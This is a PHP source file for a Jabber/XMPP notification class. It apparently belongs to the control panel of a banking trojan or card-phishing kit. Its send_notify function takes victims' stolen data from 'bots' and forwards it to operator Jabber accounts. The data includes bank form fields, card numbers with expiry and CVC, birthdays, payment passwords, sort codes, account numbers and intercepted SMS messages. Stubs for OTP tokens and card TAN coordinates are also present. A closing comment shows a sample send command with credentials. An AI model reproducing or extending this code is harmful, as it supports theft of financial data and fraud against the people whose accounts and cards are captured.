<?php
include(dirname(__FILE__) . "/XMPPHP/XMPP.php");

// CONSOLE SEND:
// jabber.php $to $msg $server $port $login $password

class Jabber
{
	private $conn = null;
	private $client_cfg = null;
	private $db = null;
	private $cfg = null;
	
	function __construct($db, $client_cfg)
	{
		$this->db = $db;
		$this->client_cfg = $client_cfg;

		$this->conn = new XMPPHP_XMPP($this->client_cfg['jabber_server'], 
			$this->client_cfg['jabber_port'], 
			$this->client_cfg['jabber_login'], 
			$this->client_cfg['jabber_password'], 'home');
			
		$this->conn->useEncryption(true);
	}
	
	public function connect()
	{
		$this->conn->connect();
		$this->conn->processUntil('session_start');
	}
	
	public static function send_static($to, $msg, $server, $port, $login, $password)
	{
		echo "send from {$login}@{$server}:{$port} pass {$password} to {$to}, msg {$msg} ..\n";
		$conn = new XMPPHP_XMPP($server, $port, $login, $password, 'home');
		$conn->useEncryption(true);
		$conn->connect();
		$conn->processUntil('session_start');
		
		$conn->message($to, $msg);
		echo "done";
		$conn->disconnect();
		die;
	}
	
	public function send($to, $msg)
	{
		if($this->conn == null)
			$this->connect();
			
		$this->conn->message($to, $msg);
	}
	
	function __desctruct()
	{
		$this->conn->disconnect();
	}
	
	// type - bank (bot.php), card (), sms, token
	function send_notify($type, $bot_id, $data)
	{
		
		$rcps = explode("\n", $this->client_cfg['jabber_rcp']);
		if(!$rcps)
			return;
			
		$full = ($this->client_cfg['jabber_notifies_type'])? true : false;
		
		$msg = "";
		
		if($type == 'bank' && $this->client_cfg['jabber_on_banks']){
			
			$msg = "[{$bot_id}] new bank";
			if($full)
			{
				$fields = '';
				foreach($data['fields'] as $key=>$val)
					$fields .= "{$key}: {$val}; ";
					
				$msg .= "; app {$data['page_id']}; fields: {$fields}";
			}
			
		}else if($type == 'card' && $this->client_cfg['jabber_on_cards']){
			
			$msg = "[{$bot_id}] new card";
			if($full)
			{
				$step = hlp::get($data, '4', false);
				if($step == 1)
				{
					$full_name = hlp::get($data, '201', '');
					$number = hlp::get($data, '202', '');
					$month = hlp::get($data, '203', '');
					$year = hlp::get($data, '204', '');
					$cvc = hlp::get($data, '205', '');
					
					$msg .= "; step 1; full_name: {$full_name}; number: {$number}; {$month}/{$year}; cvc {$cvc}";
				}else{
					
					$address = hlp::get($data, '206', '');
					$zip = hlp::get($data, '207', '');
					$phone = hlp::get($data, '208', '');
					
					$bday = hlp::get($data, '209', '');
					$bmonth = hlp::get($data, '210', '');
					$byear = hlp::get($data, '211', '');
					$birthday = "{$bday}/{$bmonth}/{$byear}";
					
					$pay_pass = hlp::get($data, '212', '');
					
					$sort = hlp::get($data, '213', '');
					$account_number = hlp::get($data, '214', '');
					
					$msg .= "; step 2; address: {$address}; zip: {$zip}; phone: {$phone}; birthday: {$birthday}; pay_pass: {$pay_pass}; sort: {$sort}; account_number: {$account_number}";
				}
			}
			
		}else if($type == 'sms' && $this->client_cfg['jabber_on_sms']){
			
			$text = $data['401']; 
			$num = $data['402']; 
			$date = $data['403']; 
			
			$numbers = explode("\n", $this->client_cfg['jabber_sms_numbers']);
			if(!$numbers || !in_array($num, $numbers))
				return;
				
			$msg = "[{$bot_id}] new sms";
			if($full)
				$msg .= "; date: {$date}; number: {$num}; text: {$text}";
			
		}else if($type == 'token' && $this->client_cfg['mod_otp_tokens'] && $this->client_cfg['jabber_on_tokens']){
			// TODO msg to jabber on new tokens
		}else if($type == 'coords' && $this->client_cfg['mod_cardtan'] && $this->client_cfg['jabber_on_coords']){
			// TODO msg to jabber on new tokens
		}
		
		if($msg == "")
			return;
			
		$args = 
			escapeshellarg($msg) . " " .
			escapeshellarg($this->client_cfg['jabber_server']) . " " .
			escapeshellarg($this->client_cfg['jabber_port']) . " " .
			escapeshellarg($this->client_cfg['jabber_login']) . " " .
			escapeshellarg($this->client_cfg['jabber_password']);
		
		// run async process to send to all $rcps
		foreach($rcps as $rcp)
		{
			$cmd = "php " . dirname(__FILE__) . "/jabber.php " . escapeshellarg($rcp) . " " . $args;
			//echo $cmd."\n";
			hlp::exec_bg($cmd);
		}
	}
	
	
}

// CONSOLE LAUNCH
if(php_sapi_name() == 'cli' && $argc == 7)
	Jabber::send_static($argv[1], $argv[2], $argv[3], $argv[4], $argv[5], $argv[6]);

# php jabber.php @thesecure.biz HIII jabb.im 5222 tae111ta taeta









